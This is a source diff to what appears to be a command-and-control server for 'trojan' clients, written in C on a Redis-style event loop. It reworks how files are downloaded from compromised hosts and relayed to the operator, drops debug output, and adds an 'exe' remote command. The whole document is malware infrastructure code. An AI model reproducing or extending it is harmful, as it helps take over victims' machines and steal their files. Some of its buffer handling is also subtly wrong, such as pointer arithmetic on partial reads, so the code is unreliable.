@@ -24,7 +24,7 @@ typedef struct thread_arg{
 	aeDeleteFileEvent(server.el, (trojan)->fd, AE_WRITABLE);\
 	fcntl((trojan)->fd, F_SETFL, 0);\
 	struct timeval tv;                                    \
-	tv.tv_sec = 2;                                           \
+	tv.tv_sec = 1;                                           \
 	tv.tv_usec = 0;                                               \
 	setsockopt((trojan)->fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)); \
 	setsockopt((client)->fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)); \
@@ -100,7 +100,6 @@ client* threadGetClient(client* c, int argc){
 		if(!c->cur_trojan && argc >= 2 && !strncmp(c->argv[1]->ptr, cl->hashid + 1, 5)){
 			break;
 		}
-		printf("argc: %d ---%s--- cmp ---%s---\r\n", argc, (char*) c->argv[1]->ptr, cl->hashid);
 		cl = NULL;
 	}
 	return cl;
@@ -374,30 +373,66 @@ void* download_thread_func(void* arg){
 	ret = write(cl->fd, pac.data, strlen(pac.data));
 	if(ret < 0){
 		unlinkClients(c, cl);
+		addReply(c, shared.err);
 		return NULL;
 	}
 
+	ret = read(cl->fd, &pac, sizeof(pac));
+	if(pac.type != 3){
+		unlinkClients(c, cl);
+		addReply(c, shared.err);
+		return NULL;
+	}
 
 	char filenamebuf[1024];
 	char *filename = NULL;
-	while(filename == NULL)
-		filename = tmpnam(filenamebuf);
-	int file = open(filename, O_WRONLY | O_CREAT, 0666);
 
-	if(_download(cl->fd, filename)){
-		if(c->cur_trojan){
-			addReply(c, shared.ok);
+	if(c->cur_trojan){
+		while(filename == NULL)
+			filename = tmpnam(filenamebuf);
+		if(_download(cl->fd, filename)){
 			rename(filename, download_file);
+			addReply(c, shared.ok);
+			unlinkClients(c, cl);
+			return NULL;
 		}
-		else{
-			close(file);
-			ret = write(c->fd, "+OK\r\n", sizeof("+OK DOWNLOADED\r\n"));
-			if(_upload(c->fd, filename))
-				remove(filename);
+		addReply(c, shared.err);
+		unlinkClients(c, cl);
+		return NULL;
+	}
+	else{
+		/* cclient tranport! */
+		ret = write(c->fd, "+OK\r\n", sizeof("+OK\r\n"));
+		while(1){
+			memset(&pac, 0, sizeof(pac));
+			ret = read(cl->fd, &pac, sizeof(pac));
+			if(ret <= 0){
+				pac.type = 0;
+				ret = write(c->fd, &pac, sizeof(pac));
+				unlinkClients(c, cl);
+				return NULL;
+			}
+			/* handle tcp delay*/
+			while(ret != sizeof(pac)){
+				ret += read(cl->fd, (&pac) + ret, sizeof(pac) - ret);
+			}
+			printf("get data type: %d, len: %d , read data ret: %d\r\n", pac.type, pac.len, ret);
+			switch(pac.type){
+			case 1:
+				ret = write(c->fd, &pac, sizeof(pac));
+				break;
+			case 2:
+				ret = write(c->fd, &pac, sizeof(pac));
+				unlinkClients(c, cl);
+				return NULL;
+			default:
+				pac.type = 0;
+				ret = write(c->fd, &pac, sizeof(pac));
+				unlinkClients(c, cl);
+				return NULL;
+			}
 		}
 	}
-	else
-		addReply(c, shared.err);
 	unlinkClients(c, cl);
 
 	return NULL;
@@ -510,7 +545,6 @@ static void* ls_thread_func(void *arg){
 		while(count % 1400 == 0){
 			memset(buff, 0, sizeof(buff));
 			count = read(cl->fd, buff, sizeof(buff));
-			printf("[-]read data from trojan count: %d\n", count);
 
 			ret = write(c->fd, buff, strlen(buff));
 			if(ret < 0)
@@ -561,6 +595,7 @@ err:	/* error handle*/
 
 /*    generateComamnd using macro      */
 generateCommandTimes(new, 2)
+generateCommandTimes(exe, 2)
 generateCommandTimes(cat, 3)
 generateCommandTimes(copy, 2)
 generateCommandTimes(cut, 2)
